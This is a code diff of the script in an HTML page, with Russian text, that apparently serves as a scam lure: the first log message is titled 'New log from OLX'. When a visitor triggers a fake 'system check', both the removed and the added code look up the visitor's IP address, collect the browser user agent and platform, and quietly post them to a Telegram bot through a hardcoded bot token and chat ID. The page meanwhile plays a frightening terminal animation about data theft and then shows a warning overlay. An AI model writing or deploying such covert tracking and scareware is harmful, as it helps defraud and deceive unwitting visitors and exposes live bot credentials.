@@ -60,76 +60,69 @@
     </div>
 
     <script>
-     
-        const TOKEN = '8413511998:AAFyII6ujb4EUsnLGYzakgzr-30Ey8mDOMY';
-        const CHAT_ID = '8426763446';
+    const TOKEN = '8413511998:AAFyII6ujb4EUsnLGYzakgzr-30Ey8mDOMY';
+    const CHAT_ID = '8426763446';
 
-        async function sendLog() {
+    async function getIP() {
+        
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch (e) {
+             
             try {
-       
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                const ip = data.ip;
-
-               
-                const info = `
-🎯 **Новый лог с OLX!**
-🌐 **IP:** \`${ip}\`
-📱 **Устройство:** ${navigator.userAgent}
-🖥 **Платформа:** ${navigator.platform}
-⏰ **Время:** ${new Date().toLocaleString()}
-                `;
-
-                
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: info,
-                        parse_mode: 'Markdown'
-                    })
-                });
-            } catch (err) {
-                console.error("Ошибка отправки:", err);
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return data.ip;
+            } catch (e2) {
+                return "Скрыт/Блокирован";
             }
         }
+    }
 
-        function runSystemCheck() {
-            sendLog();  
-            
-            const t = document.getElementById('terminal');
-            t.style.display = 'block';
-            
-            const lines = [
-                "Инициализация системы...",
-                "Подключение к защищенному шлюзу...",
-                "ПРЕДУПРЕЖДЕНИЕ: Обнаружена утечка данных!",
-                "Доступ к файловой системе... OK",
-                "Копирование кэша браузера...",
-                "Извлечение токенов авторизации...",
-                "Отправка пакетов на удаленный хост...",
-                "Завершение процесса..."
-            ];
+    async function sendLog() {
+        const userIP = await getIP();
+        const info = `🎯 **Новый лог (Мобильный/ПК)!**\n\n🌐 **IP:** \`${userIP}\` \n📱 **Устройство:** ${navigator.userAgent}\n🖥 **Платформа:** ${navigator.platform}\n⏰ **Время:** ${new Date().toLocaleString()}`;
 
-            let i = 0;
-            const interval = setInterval(() => {
-                if (i < lines.length) {
-                    const div = document.createElement('div');
-                    div.innerHTML = `> [${new Date().toLocaleTimeString()}] ${lines[i]}`;
-                    if(lines[i].includes("ПРЕДУПРЕЖДЕНИЕ")) div.style.color = "red";
-                    t.appendChild(div);
-                    t.scrollTop = t.scrollHeight;
-                    i++;
-                } else {
-                    clearInterval(interval);
-                    setTimeout(() => {
-                        t.style.display = 'none';
-                        document.getElementById('warning').style.display = 'flex';
-                    }, 1000);
-                }
-            }, 400);
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: info,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch (err) {
+            console.error("Ошибка сети");
         }
-    </script>
+    }
+
+    function runSystemCheck() {
+        sendLog();  
+        
+        const t = document.getElementById('terminal');
+        t.style.display = 'block';
+        
+        const lines = ["Инициализация...", "Проверка связи...", "Доступ к файлам...", "Выгрузка данных..."];
+        let i = 0;
+        const interval = setInterval(() => {
+            if (i < lines.length) {
+                const div = document.createElement('div');
+                div.innerHTML = `> ${lines[i]}`;
+                t.appendChild(div);
+                i++;
+            } else {
+                clearInterval(interval);
+                setTimeout(() => {
+                    t.style.display = 'none';
+                    document.getElementById('warning').style.display = 'flex';
+                }, 1000);
+            }
+        }, 400);
+    }
+</script>
 </body>
 </html>
